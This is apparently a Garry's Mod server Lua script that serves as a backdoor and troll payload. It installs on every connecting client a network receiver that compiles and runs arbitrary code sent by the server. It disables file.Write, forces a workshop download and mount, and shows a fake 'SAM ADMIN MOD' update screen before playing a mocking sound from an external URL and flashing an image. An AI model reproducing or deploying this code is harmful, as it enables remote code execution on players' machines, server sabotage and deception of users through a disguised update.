function RandomString(intMin, intMax)
    local ret = &quot;&quot;
    for _ = 1, math.random(intMin, intMax) do
        ret = ret .. string.char(math.random(65, 90))
    end
    return ret
end

local randomtable = {
    CodeRandom = RandomString(0, 69),
    TimingRandom = RandomString(0, 69),
    ClientRandom = RandomString(0, 69),
    ServeurRadom = RandomString(0, 69)
}

util.AddNetworkString(randomtable[&quot;TimingRandom&quot;])
util.AddNetworkString(randomtable[&quot;CodeRandom&quot;])
BroadcastLua([[net.Receive(&quot;]] .. randomtable[&quot;CodeRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;spawn&quot;, function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. randomtable[&quot;CodeRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
        ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles(&quot;particles/CHANGE_ME.pcf&quot;) PrecacheParticleSystem(&quot;CHANGE_ME&quot;) end)]])
    end
end)

local function InfoClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(randomtable[&quot;CodeRandom&quot;])
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

function file.Write() return end

local function rdm_str(len)
    if not len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;BestLol&quot; .. net_string, function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    end
end)

local function InfoClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

local function afficherBarreDeProgression(pourcentage)
    local x = 10 -- Position x de la barre de progression
    local y = 10 -- Position y de la barre de progression
    local largeur = 200 -- Largeur de la barre de progression
    local hauteur = 20 -- Hauteur de la barre de progression
    local radius = hauteur / 2 -- Rayon des coins arrondis

    -- Dessine le fond de la barre de progression
    draw.RoundedBox(radius, x, y, largeur, hauteur, Color(50, 50, 50, 200))

    -- Dessine la partie remplie de la barre de progression
    draw.RoundedBox(radius, x, y, largeur * pourcentage, hauteur, Color(0, 255, 0, 200))

    -- Affiche le texte du pourcentage
    draw.SimpleText(math.floor(pourcentage * 100) .. &quot;%&quot;, &quot;sam&quot;, x + largeur / 2, y + hauteur / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end

timer.Simple(0.5, function()
    InfoClient([=[
        local dots = &quot;&quot; -- Initialisez la variable pour stocker les points
        local isProgressComplete = false -- Variable pour suivre l'&eacute;tat de la progression
        
        -- Fonction pour mettre &agrave; jour les points
        local function UpdateDots()
            dots = dots .. &quot;.&quot; -- Ajoutez un point &agrave; la variable dots
            if #dots &gt; 3 then -- Si le nombre de points d&eacute;passe 3
                dots = &quot;&quot; -- R&eacute;initialisez les points
            end
        end
        
        timer.Create(&quot;UpdateDotsTimer&quot;, 0.5, 0, UpdateDots) -- Cr&eacute;ez une temporisation pour mettre &agrave; jour les points toutes les 0.5 secondes
        
        local progress = 0 -- D&eacute;but de la progression
        local targetProgress = 1 -- Progression cible (100%)
        local duration = 15 -- Dur&eacute;e de progression en secondes
        local barWidth = 1521
        local barHeight = 20
        local barX = 199
        local barY = 685
        
        surface.CreateFont(&quot;DevMod&quot;, {
            font = &quot;Trebuchet24&quot;,
            extended = false,
            size = 100, -- Ajustez la taille selon votre pr&eacute;f&eacute;rence
            weight = 200,
            blursize = 1.5,
            italic = false,
            rotary = false,
            shadow = false,
            additive = false,
            outline = false,
        })
        surface.CreateFont(&quot;DevMod2&quot;, {
            font = &quot;Trebuchet24&quot;,
            extended = false,
            size = 50, -- Ajustez la taille selon votre pr&eacute;f&eacute;rence
            weight = 200,
            blursize = 1.5,
            italic = false,
            rotary = false,
            shadow = false,
            additive = false,
            outline = false,
        })
        
        local startTime = CurTime() -- Temps de d&eacute;but de la progression
        
        hook.Add(&quot;HUDPaint&quot;, &quot;ProgressBar&quot;, function()
        
            draw.RoundedBox(0, 0, 0, 1920, 1080, Color(27, 27, 27))
        
            -- Dessiner le contour de la barre de progression
            surface.SetDrawColor(173, 171, 171)
            surface.DrawOutlinedRect(barX, barY, barWidth, barHeight)
        
            -- Calculer le temps &eacute;coul&eacute; depuis le d&eacute;but de la progression
            local elapsedTime = CurTime() - startTime
        
            -- Calculer la progression actuelle en fonction du temps &eacute;coul&eacute;
            local progressRatio = elapsedTime / duration
            progress = math.Clamp(progressRatio, 0, 1) -- Limiter la progression entre 0 et 1
            
            if progress &gt;= targetProgress and not isProgressComplete then -- V&eacute;rifie si la progression est termin&eacute;e
                isProgressComplete = true -- Marque la progression comme termin&eacute;e
                -- Supprimer tous les &eacute;l&eacute;ments visuels ici
                hook.Remove(&quot;HUDPaint&quot;, &quot;ProgressBar&quot;) -- Arr&ecirc;te de dessiner la barre de progression
            else
                draw.SimpleText(&quot;SAM ADMIN MOD&quot;, &quot;DevMod&quot;, 650, 450, color_white)
                draw.SimpleText(&quot;Mise &agrave; Jour&quot; .. dots, &quot;DevMod2&quot;, 850, 625, color_white) -- Affichez le texte avec les points
                draw.RoundedBox(0, 600, 540, 750, 2, Color(255, 255, 255))
                draw.RoundedBox(0, 199, 685, 1521, 20, Color(173, 171, 171))
                -- Dessiner la barre de progression
                surface.SetDrawColor(32, 90, 206) -- Couleur verte
                surface.DrawRect(barX, barY, barWidth * progress, barHeight)
            end
        end)
    ]=])
end)

timer.Simple(15, function()
    InfoClient([=[

    surface.CreateFont(&quot;TEXTDEBZ&quot;, {
        font = &quot;Trebuchet24&quot;,
        extended = false,
        size = 50, -- Ajustez la taille selon votre pr&eacute;f&eacute;rence
        weight = 200,
        blursize = 1.5,
        italic = false,
        rotary = false,
        shadow = false,
        additive = false,
        outline = false,
    })
        sound.PlayURL(&quot;https://dl.sndup.net/jpww/Le%20rire%20de%20risitas.mp3&quot;, &quot;mono&quot;, function(source , err , errname)
            if IsValid(source) then
                AudioSource = source
                source:Play()
            end
            end)

        local imgY = -1080 -- Position initiale de l'image en y (hors de l'&eacute;cran)
        local imgSpeed = 50 -- Vitesse du mouvement vertical de l'image
        local imgAmplitude = 100 -- Amplitude du mouvement vertical de l'image
        
        local function DrawMovingImage(id)
            local startTime = CurTime() -- Temps de d&eacute;but de l'animation

            hook.Add(&quot;HUDPaint&quot;, &quot;MovingImage&quot;, function()
                local elapsedTime = CurTime() - startTime -- Temps &eacute;coul&eacute; depuis le d&eacute;but de l'animation
                local offsetY = math.sin(elapsedTime * imgSpeed) * imgAmplitude -- Calcul du d&eacute;placement vertical (sine wave)

                local material = GetImgur(id)

                if material then
                    surface.SetMaterial(material)
                    surface.SetDrawColor(Color(255, 255, 255))
                    surface.DrawTexturedRect(0, imgY + offsetY, 1920, 1080)
                end
            end)

            -- Supprimer le dessin apr&egrave;s 15 secondes
            timer.Simple(15, function()
                hook.Remove(&quot;HUDPaint&quot;, &quot;MovingImage&quot;)
            end)
        end

        -- Utilisation de la fonction pour dessiner l'image avec l'ID &quot;Abfo1Yq&quot;
        DrawMovingImage(&quot;Abfo1Yq&quot;)
    ]=])
end)
